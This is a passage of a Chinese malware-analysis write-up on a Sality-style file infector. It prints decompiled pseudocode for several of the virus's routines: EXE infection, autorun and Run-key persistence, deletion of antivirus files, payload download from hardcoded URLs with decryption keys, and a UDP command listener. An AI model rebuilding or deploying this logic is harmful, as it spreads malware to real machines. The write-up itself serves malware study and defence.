    return 0;
  sub_4049AB(hModule, v4, &v19, v20);//获取导出函数表的RVA和函数数量
  v6 = 0;
  for ( i = (_DWORD *)(hModule + v1); (*i - *(_DWORD *)(v19 + 28)) < *(_DWORD *)(v19 + 56); ++i )//计算注入代码的位置。（从驱动程序的基地址hModule+注入代码的RVA v1开始）
    ++v6;
  v10 = GlobalAlloc(0x40u, 4 * v6 + 4);//为注入代码申请内存
  v6 = 0;
  for ( j = (_DWORD *)(hModule + v1); (*j - *(_DWORD *)(v19 + 28)) < *(_DWORD *)(v19 + 56); ++j )
    v10[v6++] = v22 + *j - *(_DWORD *)(v19 + 28);//将注入代码的地址写入_DWORD数组v10中，并将开头设置为特殊标记666
  *v10 = 666;
  hFile = CreateFileA(lpFileName, 0x40000000u, 0, 0, 3u, 0, 0);
  if ( hFile == (HANDLE)-1 )
    return 0;
  WriteFile(hFile, v10, 4 * v6, &NumberOfBytesWritten, 0);//打开驱动程序所在的文件，并通过 WriteFile 将注入代码写入驱动中
  CloseHandle(hFile);
  GlobalFree(v10);//释放申请的内存
  FreeLibrary(hModule);//关闭加载的库文件
  if ( NewFileName[0] )
    DeleteFileA(NewFileName);//删除临时文件
  return 1;//返回1则表示注入成功
}
```

#### sub_40E3B4

第三个线程用于 autorun.inf 文件的创建写入，枚举指定注册表中特定文件，并感染相关文件。

```c++
void __stdcall __noreturn sub_40E3B4(LPVOID lpThreadParameter)
{
  memset(String1, 0, sizeof(String1));
  while ( !dword_476204 )
    Sleep(0x400u);
  lstrcpyA(String1, sfc);
  dword_414000 = 0;
  hModule = LoadLibraryA(String1);//加载 sfc.dll
  if ( hModule )
    dword_414000 = (int)GetProcAddress(hModule);
  if ( !dword_414000 )
  {
    FreeLibrary(hModule);
    lstrcatA(String1, _os);
    hModule = LoadLibraryA(String1);//加载sfc_os.dll
    if ( hModule )
      dword_414000 = (int)GetProcAddress(hModule);
  }
  v1 = CreateThread(0, 0, sub_40DC44***, 0, 0, &ThreadId);
  sub_4010E5(v1, 0, 0);//检测临界
  v2 = CreateThread(0, 0, sub_40CAAA***, 0, 0, &ThreadId);//感染注册表中的可执行文件
  sub_4010E5(v2, 0, 0);//检测临界
  Sleep(0x400u);
  Parameter = 66;
  while ( Parameter < 0x5A )
  {
    v3 = CreateThread(0, 0, sub_40C8F3***, &Parameter, 0, &ThreadId);
    sub_4010E5(v3, 0, 0);
    ++Parameter;
    Sleep(0x400u);
  }
  Sleep(0x400u);
  sub_40C51E***(HKEY_CURRENT_USER);
  sub_40C51E(HKEY_LOCAL_MACHINE);
  while ( 1 )
    Sleep(0xDBBA0u);
}
```

##### sub_40DC44在临时目录创建恶意文件

在C:\Users\用户名\AppData\Local\Temp\下创建一个"%s.exe"或"win%s.exe"的文件，并写入内容，检测 MZ、PE 来验证写入是否成功，否则会退出当前子线程，之后会在驱动器根目录创建一个 autorun.inf 的文件

![image-20241106181637212](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202502232153627.png)

##### sub_40CAAA感染注册表中的可执行文件

遍历 最近打开过的应用程序的资源文件位置记录 和 指向当前用户的Shell配置信息下的键值，
HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\
感染该注册表中的可执行文件。

![image-20241106181650148](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202502232153628.png)

##### sub_40C8F3

![image-20241107115805605](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202502232153629.png)

###### sub_40BABA遍历感染

```c++
int __cdecl sub_40BABA(int a1, LPSTR lpString1, char a3, LPWIN32_FIND_DATAA lpFindFileData)
{
  memset(String1, 0, sizeof(String1));
  ms_exc.registration.TryLevel = 0;
  Sleep(a3 != 0 ? 4096 : 2048);
  if ( lpString1[a1 - 1] != '\\' )
  {
    lstrcatA(lpString1, asc_48566C);            // '\'
    ++a1;
  }
  lstrcpyA(String1, lpString1);
  CharLowerA(String1);
  if ( sub_40429F(String1, sz) )
  {
    ms_exc.registration.TryLevel = -1;
    return 0;
  }
  else
  {
    lstrcatA(lpString1, asc_485670);            // '*'
    hFindFile = FindFirstFileA(lpString1, lpFindFileData);
    if ( hFindFile != (HANDLE)-1 )
    {
      while ( FindNextFileA(hFindFile, lpFindFileData) )
      {
        if ( lpFindFileData->cFileName[0] != 46 )
        {
          if ( !lpFindFileData->cFileName[0] )
            break;
          if ( v7 > 0x64 )
          {
            v7 = 0;
            Sleep(a3 != 0 ? 4096 : 3072);
          }
          if ( (unsigned int)(lstrlenA(lpFindFileData->cFileName) + a1) <= 0xFA )
          {
            lpString1[a1] = 0;
            lstrcatA(lpString1, lpFindFileData->cFileName);
            i = lstrlenA(lpString1) - 4;
            CharUpperA(lpFindFileData->cFileName);
            if ( lstrlenA(lpFindFileData->cFileName) > 2
              && (!lstrcmpiA(&lpString1[i], EXE[0]) || !lstrcmpiA(&lpString1[i], SRC[0])) )//遍历C盘文件（只要 C 盘类型不是光驱）就会感染 exe 和 scr 文件
            {
              for ( i = 0; *Anvir[i]; ++i )
              {//如果文件名与杀软相同，则会删除该文件
                if ( sub_40429F(lpFindFileData->cFileName, Anvir[i]) )
                  sub_4056FB(lpString1, 0);//Delete
              }
              sub_40965F(lpString1, 0, 0);
            }
            lpString1[a1] = 0;
            if ( (lpFindFileData->dwFileAttributes & 0x10) != 0 && lpFindFileData->cFileName[0] != 46 )
            {
              lstrcpyA(&lpString1[a1], lpFindFileData->cFileName);
              v6 = lstrlenA(lpFindFileData->cFileName);
              v14 = v6 + a1;
              v5 = lstrcmpiA(lpFindFileData->cFileName, off_48158C);
              if ( v5 )
              {
                LOBYTE(v5) = a3;
                sub_40BABA(v14, lpString1, v5, lpFindFileData);
              }
              a1 = v14 - v6;
              lpString1[a1] = 0;
            }
            ++v7;
          }
          else
          {
            ++v7;
          }
        }
      }
    }
    ms_exc.registration.TryLevel = -1;
    if ( hFindFile )
      FindClose(hFindFile);
    Sleep(0x400u);
    return 0;
  }
}
```

##### sub_40C51E设置感染程序开机自启动
```c++
int __cdecl sub_40C51E(HKEY hKey)
{
  memset(SubKey, 0, sizeof(SubKey));
  memset(Data, 0, sizeof(Data));
  wsprintfA(SubKey, "%s%s", off_4814A8[0], off_4815CC[0]);//"Software\Microsoft\Windows\CurrentVersion\\Run"
  if ( !RegOpenKeyExA(hKey, SubKey, 0, 0x20019u, &phkResult) )
  {
    for ( dwIndex = 0; ; ++dwIndex )
    {
      cchValueName = 255;
      Type = 0;
      cbData = 255;
      if ( RegEnumValueA(phkResult, dwIndex, SubKey, &cchValueName, 0, &Type, Data, &cbData) )
        break;
      lpString = (LPCSTR)sub_40429F(Data, EXE[0]);
      if ( lpString )
      {
        v1 = lstrlenA((LPCSTR)Data);
        Data[v1 - lstrlenA(lpString) + 4] = 0;
        lpString = (LPCSTR)Data;
        if ( Data[0] == 34 )
          ++lpString;
        sub_40965F(lpString, 0, 0);
        Sleep(0x400u);
      }
    }
    RegCloseKey(phkResult);
  }
  return 1;
}
```

#### sub_403F6C

该线程会从硬编码中的 URL 下载文件，解密文件并执行该文件。

打开硬编码中的URL并下载文件，文件会被命名为 随机字符串.exe 或 win+随机字符串.exe。
URL为 http://89.119.67[.]154/testo5/ 、http://kukutrustnet777[.]info/home.gif 、http://kukutrustnet888[.]info/home.gif 、http://kukutrustnet987[.]info/home.gif;

```c++
void __stdcall __noreturn sub_403F6C(LPVOID lpThreadParameter)
{
  memset(Buffer, 0, sizeof(Buffer));
  memset(String1, 0, sizeof(String1));
  memset(v3, 0, sizeof(v3));
  if ( dword_4140CC )
    Sleep(0x2BF20u);
  Sleep(0x2BF20u);
  v1 = sub_4013EA();
  Sleep(v1 % 30000 + 1024);
  while ( 1 )
  {
    sub_412B8B(v3, &dword_475C58, 1164);
    while ( v8 < LOBYTE(v3[3])
         && (!BYTE1(v3[1])
          || (BYTE1(v3[1]) != 1 || (unsigned int)dword_4140C4 >= 0xF42400)
          && (BYTE1(v3[1]) != 2 || (unsigned int)dword_4140C4 <= 0xF42400)) )
    {
      for ( i = v9; *((_BYTE *)&v3[3] + i) && (unsigned int)(i - v9) < 0x50; ++i )
        ;
      ++i;
      lstrcpyA(String1, (LPCSTR)&v3[3] + v9);
      if ( String1[0] != 'h' || String1[1] != 't' || String1[2] != 't' || String1[3] != 'p' )
        break;
      sub_405BC9(Buffer);//文件被命名为 随机字符串.exe 或 win + 随机字符串.exe
      if ( LOBYTE(v3[1]) == 1 )
      {
        sub_40C1CC(String1);//解密文件
      }
      else if ( !LOBYTE(v3[1]) )
      {
        nNumberOfBytesToRead = sub_40B865***(String1, Buffer, 0, 500000);//打开硬编码中的URL并下载文件
        if ( nNumberOfBytesToRead )
          sub_40BE66***(Buffer, nNumberOfBytesToRead, 2);//解密下载的文件并执行，删除原来下载的加密文件
      }
      v9 = i;
      ++v8;
    }
    if ( HIWORD(dword_475C5C) )
      Sleep(60000 * HIWORD(dword_475C5C));
    else
      Sleep(0x1B7740u);
  }
}
```

##### sub_40B865打开硬编码中的URL并下载文件

lpszAgent即UA 为 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731)

![image-20241107182031179](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202502232153630.png)

##### sub_40BE66解密下载的文件并执行，删除原来下载的加密文件

```c++
DWORD __cdecl sub_40BE66(CHAR *lpFileName, DWORD nNumberOfBytesToRead, int a3)
{
  memset(v14, 0, sizeof(v14));
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  hFile = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0, 0);
  if ( hFile == (HANDLE)-1 )
    return 0;
  lpBuffer = GlobalAlloc(0x40u, nNumberOfBytesToRead + 4096);
  ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
  if ( a3 == 1 )
  {
    v4 = lstrlenA(kukutrusted);                 // 密钥:"kukutrusted!."
    sub_40120B((int)kukutrusted, v4, (int)v12);
    sub_4012E4((int)lpBuffer, nNumberOfBytesToRead, (int)v12);//解密
  }
  else if ( a3 == 2 )
  {
    for ( ThreadId = 0; ThreadId < nNumberOfBytesToRead; ThreadId += 1024 )
    {
      v5 = lstrlenA(GdiPlus_dll);//密钥:"GdiPlus.dll"
      sub_40120B((int)GdiPlus_dll, v5, (int)v12);
      sub_4012E4((int)lpBuffer + ThreadId, 1024, (int)v12);//解密
    }
  }
  SetFilePointer(hFile, 0, 0, 0);
  WriteFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
  SetFilePointer(hFile, nNumberOfBytesToRead, 0, 0);
  SetEndOfFile(hFile);
  CloseHandle(hFile);
  if ( *(_BYTE *)lpBuffer == 'M' && *((_BYTE *)lpBuffer + 1) == 'Z' )//验证是不是可执行文件
  {
    if ( lpBuffer )
      GlobalFree(lpBuffer);
    StartupInfo.cb = 'D';
    memset(&StartupInfo.lpReserved, 0, 12);
    StartupInfo.dwFlags = 1;
    StartupInfo.cbReserved2 = 0;
    StartupInfo.lpReserved2 = 0;
    StartupInfo.wShowWindow = 0;
    lstrcpyA(&String1, lpFileName);
    for ( NumberOfBytesRead = lstrlenA(&String1) - 1; NumberOfBytesRead; --NumberOfBytesRead )
    {
      if ( v14[NumberOfBytesRead - 1] == '\\' )
      {
        v14[NumberOfBytesRead] = 0;
        break;
      }
    }
    NumberOfBytesRead = CreateProcessA(0, lpFileName, 0, 0, 0, 0, 0, &String1, &StartupInfo, &ProcessInformation);
    Sleep(0x400u);
    v6 = CreateThread(0, 0, sub_40567F, &lpFileName, 0, &ThreadId);//创建新文件，删除原来下载的加密文件
    sub_4010E5(v6, 0, 0);
    Sleep(0x400u);
    return NumberOfBytesRead;
  }
  else
  {
    if ( lpBuffer )
      GlobalFree(lpBuffer);
    DeleteFileA(lpFileName);
    return 1;
  }
}
```

#### sub_40EED0 创建一个名为 hh8geqpHJTkdns0 的内存映射文件

![image-20241111180226810](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194100745.png)

#### sub_405782遍历临时目录，删除文件名长度大于 4 的 exe 以及删除 rar 文件

```c++
void __stdcall __noreturn sub_405782(LPVOID lpThreadParameter)
{
  memset(Buffer, 0, sizeof(Buffer));
  memset(String1, 0, sizeof(String1));
  memset(&FindFileData, 0, sizeof(FindFileData));
  GetTempPathA(0x100u, Buffer);
  if ( Buffer[lstrlenA(Buffer) - 1] != '\\' )
    lstrcatA(Buffer, '\');
  while ( 1 )
  {
    v1 = lstrlenA(Buffer);
    lstrcpyA(String1, Buffer);
    lstrcatA(String1, '*');
    Read_file(&FindFileData, 0, 320);
    FirstFileA = FindFirstFileA(String1, &FindFileData);
    if ( FirstFileA != (HANDLE)-1 )
    {
      while ( FindNextFileA(FirstFileA, &FindFileData) )
      {
        String1[v1] = 0;
        lstrcatA(String1, FindFileData.cFileName);
        v10 = lstrlenA(String1) - 4;
        if ( lstrlenA(FindFileData.cFileName) > 4 && !lstrcmpiA(&String1[v10], ".EXE") )
          sub_4056FB(String1, 1);
        if ( (FindFileData.dwFileAttributes & 0x10) != 0
          && FindFileData.cFileName[0] != '.'
          && !lstrcmpiA(&String1[v10], '_Rar') )
        {
          sub_40573A(String1);
        }
        Sleep(0x100u);
      }
    }
    if ( FirstFileA )
      FindClose(FirstFileA);
    Sleep(0x927C0u);
  }
}
```

sub_401189 检查句柄状态，做资源分配调度

循环遍历一个句柄数组，它有0x186A0（100,000）个元素，检查其中的每一个句柄是否处于 signaled 状态。如果某个句柄处于 signaled 状态，就将该句柄关闭，并将其置为 0，在执行多线程时进行线程资源的分配调度。

![image-20241111180338134](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260309194105376.png)

#### sub_4038BB 线程绑定端口 4098，创建新线程用于接收从控制端发送的数据

```c++
void __stdcall __noreturn sub_4038BB(LPVOID lpThreadParameter)
{
  memset(buf, 0, sizeof(buf));
  *(_DWORD *)optval = 0;
  fromlen = 0;
  memset(&from, 0, sizeof(from));
  Parameter = 0;
  name.sa_family = 2;
  *(_WORD *)name.sa_data = htons(hostshort);
  memset(&name.sa_data[2], 0, 12);
  s = socket(2, 2, 0);
  if ( s != -1 )
  {
    *(_DWORD *)optval = 0x100000;
    setsockopt(s, 0xFFFF, 4098, optval, 4);//线程绑定端口 4098
    if ( !bind(s, &name, 16) )
    {
      while ( 1 )
      {
        do
        {
          fromlen = 16;
          v9 = recvfrom(s, buf, 4095, 0, &from, &fromlen);
        }
        while ( v9 == -1 );
        v5 = buf;
        Parameter = &from;
        v6 = v9;
        v7 = s;
        InterlockedExchange(&dword_478658, 1);
        v1 = CreateThread(0, 0, StartAddress, &Parameter, 0, 0);
        sub_4010E5(v1, 0, 0);
        while ( dword_478658 )
          Sleep(0xCu);
      }
    }
  }
  if ( s != -1 )
    closesocket(s);
  ExitThread(0);
}
```

#### sub_403D42 创建一个子线程，用于和控制端进行交互

```c++
void __stdcall __noreturn sub_403D42(LPVOID lpThreadParameter)
{
  memset(v7, 0, sizeof(v7));
  v8 = 0;
  v9 = 0;
  lpParameter = 0;
  sub_40EED0(v3);//创建一个名为 hh8geqpHJTkdns0 的内存映射文件
  sub_40F600***(v3, 1);
  sub_403CBD();
  Sleep(0x493E0u);
  while ( 1 )
  {
    dword_4140C8 = sub_40F420(v3);
    Addend = 0;
    for ( i = 0; ; ++i )
    {
      lpParameter = sub_40F380(v3);
      if ( !lpParameter || i >= 0x3E8 )
        break;
      v1 = CreateThread(0, 0, sub_403AEF, lpParameter, 0, &ThreadId);
      sub_4010E5(v1, 0, 0);
      Sleep(0x200u);
      while ( Addend > 5 )
        Sleep(0x100u);
    }
    while ( Addend > 0 )
      Sleep(0x100u);
    sub_40F400(v3);
    Sleep(0x400u);
    if ( (unsigned int)dword_4140C8 > 0x12C )
      sub_40F4A0(v3);
    Sleep(0x400u);
    sub_40F600(v3, 0);
    sub_403CBD();
    Sleep(0x249F00u);
  }
}
```



参考：

[看雪学苑-看雪-安全培训|安全招聘|www.kanxue.com](https://www.kanxue.com/chm.htm?id=18748)

[Sality病毒逆向分析 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-537381-1-1.html)